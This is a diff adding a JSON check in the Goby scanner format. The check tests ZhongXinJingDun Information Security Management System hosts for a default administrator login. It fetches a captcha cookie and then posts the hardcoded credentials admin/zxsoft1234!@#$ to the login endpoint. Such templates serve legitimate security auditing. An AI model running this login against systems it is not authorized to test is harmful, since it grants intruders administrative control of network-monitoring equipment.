@@ -1,0 +1,96 @@
+{
+      "Name": "ZhongXinJingDun Information Security Management System Default Login",
+      "Level": "1",
+      "Tags": [
+            "defaultaccount"
+      ],
+      "GobyQuery": "title=\"中新金盾信息安全管理系统\"",
+      "Description": "The ZhongXinJingDun information security management system realizes the collection, monitoring, analysis, early warning and control of various resource information such as network traffic, IP address, domain name, information content, and application in the IDC room.",
+      "Product": "ZhongXinJingDun Information Security Management System",
+      "Homepage": "http://www.cnzxsoft.com/",
+      "Author": "",
+      "Impact": "ZhongXinJingDun Information Security Management System Default Login (admin/zxsoft1234!@#$)",
+      "Recommendation": "",
+      "References": [],
+      "HasExp": false,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "?q=common/getcode",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$head",
+                                    "operation": "contains",
+                                    "value": "check_code",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastheader|regex|check_code=(.*?);"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "POST",
+                        "set_variable": [
+                              "check_code|lastheader|regex|check_code=(.*?);"
+                        ],
+                        "uri": "?q=common/login",
+                        "follow_redirect": false,
+                        "header": {
+                              "Cookie": "check_code={{{check_code}}}",
+                              "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+                        },
+                        "data_type": "text",
+                        "data": "name=admin&password=zxsoft1234!@#$&checkcode={{{check_code}}}&doLoginSubmit=1"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "1",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
